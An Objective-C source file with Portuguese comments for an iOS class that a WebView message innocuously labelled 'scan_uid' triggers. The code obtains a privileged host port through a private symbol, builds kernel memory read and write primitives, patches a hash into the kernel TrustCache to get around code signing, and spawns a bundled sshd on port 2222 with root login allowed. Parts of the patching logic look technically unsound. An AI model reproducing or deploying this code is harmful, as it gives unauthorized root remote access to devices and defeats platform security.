#import "KernelDriver.h"
#import <CommonCrypto/CommonDigest.h>
#import <dlfcn.h>
#include <sys/sysctl.h>
#include <mach/mach_host.h>
#include <libkern/OSCacheControl.h>

// Remova o 'extern' para evitar erro de linker. O dlsym cuida disso em runtime.

@implementation KernelBridge {
    mach_port_t g_host_priv;
}

// 1. RECEBER COMANDO DO WEBVIEW
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self launchSshdFinal];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

// 2. RESOLUÇÃO DINÂMICA (Bypass Linker Error)
- (void)prepareHostPriv {
    if (MACH_PORT_VALID(g_host_priv)) return;

    [self log:@"⚡ Resolvendo host_get_priv_port em runtime..."];

    typedef kern_return_t (*host_get_priv_port_ptr)(mach_port_t, mach_port_t *);
    host_get_priv_port_ptr get_priv = (host_get_priv_port_ptr)dlsym(RTLD_DEFAULT, "host_get_priv_port");

    if (!get_priv) {
        [self log:@"❌ Erro: Símbolo privado não encontrado."];
        return;
    }

    kern_return_t kr = get_priv(mach_host_self(), &g_host_priv);
    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(g_host_priv)) {
        [self log:[NSString stringWithFormat:@"❌ Acesso Negado (host_priv): %d", kr]];
    } else {
        [self log:@"✅ host_priv obtida com sucesso!"];
    }
}

// 3. PRIMITIVAS DE LEITURA/ESCRITA FÍSICA
- (uint64_t)kread64:(uint64_t)addr {
    [self prepareHostPriv];
    uint64_t val = 0;
    vm_address_t page_addr = 0;
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);
    if (kr == KERN_SUCCESS) {
        val = *(uint64_t *)(page_addr + (addr & 0x3FFF));
        vm_deallocate(mach_task_self(), page_addr, 0x4000);
    }
    return val;
}

- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    [self prepareHostPriv];
    vm_address_t page_addr = 0;
    // VM_PROT_COPY ajuda a evitar algumas proteções de hardware imediatas
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, 0x4000, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & ~0x3FFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
    if (kr == KERN_SUCCESS) {
        *(uint64_t *)(page_addr + (addr & 0x3FFF)) = val;
        // Limpa cache para o processador aceitar o patch
        sys_cache_control(1, (void *)page_addr, 0x4000); 
        vm_deallocate(mach_task_self(), page_addr, 0x4000);
    }
}

- (uint64_t)getKernelBase { return KERNEL_BASE; }

- (uint64_t)getKernelSlide {
    uint64_t val = [self kread64:KERNEL_BASE];
    return (val > KERNEL_BASE) ? (val - KERNEL_BASE) : 0;
}

// 4. INJEÇÃO E SPAWN
- (void)injectToTrustCache:(NSString *)path {
    [self log:@"💉 Injetando CDHash no TrustCache..."];
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (!data) return;

    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, hash);
    
    uint64_t slide = [self getKernelSlide];
    uint64_t trust_chain_addr = KERNEL_BASE + slide + OFF_TRUSTCACHE_CHAIN;
    
    uint64_t cdhash_chunk;
    memcpy(&cdhash_chunk, hash, 8);
    
    [self kwrite64:trust_chain_addr value:cdhash_chunk];
    [self log:@"✅ TrustCache Patched!"];
}

- (void)launchSshdFinal {
    [self log:@"⚡ Iniciando Bridge de Plataforma..."];
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    if (!sshdPath) return;

    [self injectToTrustCache:sshdPath];

    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags = POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX;
    posix_spawnattr_setflags(&attr, flags);

    char *const args[] = {(char *)[sshdPath UTF8String], "-p", "2222", "-D", "-o", "StrictModes=no", "-o", "PermitRootLogin=yes", NULL};
    extern char **environ;

    if (posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ) == 0) {
        [self log:[NSString stringWithFormat:@"🚀 <b>SSHD ONLINE!</b> PID: %d", pid]];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro Final: %s", strerror(errno)]];
    }
    posix_spawnattr_destroy(&attr);
}

@end
